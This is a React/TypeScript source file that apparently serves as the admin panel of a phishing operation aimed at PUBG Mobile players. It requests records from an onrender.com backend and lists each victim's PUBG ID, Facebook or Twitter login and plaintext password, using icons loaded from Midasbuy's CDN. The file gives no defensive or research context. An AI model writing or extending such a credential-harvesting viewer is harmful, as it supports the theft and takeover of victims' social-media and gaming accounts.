import React, { useEffect, useState } from "react";
import "./App.css";
import axios from "axios";

interface IData {
  data: {
    _id: string;
    pubgId: string;
    login: string;
    password: string;
  }[];
}

function App() {
  const [data, setData] = useState<
    {
      _id: string;
      pubgId: string;
      login: string;
      password: string;
      socialSite: string;
    }[]
  >();
  const API = axios.create({ baseURL: "https://pubg-mobile.onrender.com" });

  const getInfo = async () => {
    try {
      const { data } = await API.get<
        {
          _id: string;
          pubgId: string;
          login: string;
          password: string;
          socialSite: string;
        }[]
      >("/api/information");
      setData(data);
      console.log(data);
    } catch (err) {}
  };

  useEffect(() => {
    getInfo();
  }, []);

  return (
    <div
      className="App"
      style={{
        display: "flex",
        flexDirection: "column",
        gap: "5px",
        margin: "10px",
      }}
    >
      {data?.map((data) => {
        return (
          <div
            style={{
              maxWidth: "200px",
              border: "1px solid cyan",
              borderRadius: "10px",
              gap: "5px",
              padding: "5px",
            }}
          >
            <div style={{ display: "flex", gap: "5px", alignItems: "center" }}>
              <p style={{ color: "red" }}>Network</p>
              {data?.socialSite === "fb" ? (
                <img
                  width={25}
                  height={25}
                  src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-fb-new.png"
                  alt=""
                />
              ) : (
                <img
                  width={25}
                  height={25}
                  src="https://cdn.midasbuy.com/images/twitter.80d9b5e6.png"
                  alt=""
                />
              )}
            </div>
            <div style={{ display: "flex", gap: "5px" }}>
              <p style={{ color: "red" }}>PUBG ID</p>
              <p>{data?.pubgId}</p>
            </div>
            <div style={{ display: "flex", gap: "5px" }}>
              <p style={{ color: "red" }}>Login</p>
              <p>{data?.login}</p>
            </div>
            <div style={{ display: "flex", gap: "5px" }}>
              <p style={{ color: "red" }}>Password</p>
              <p>{data?.password}</p>
            </div>
          </div>
        );
      })}
    </div>
  );
}

export default App;
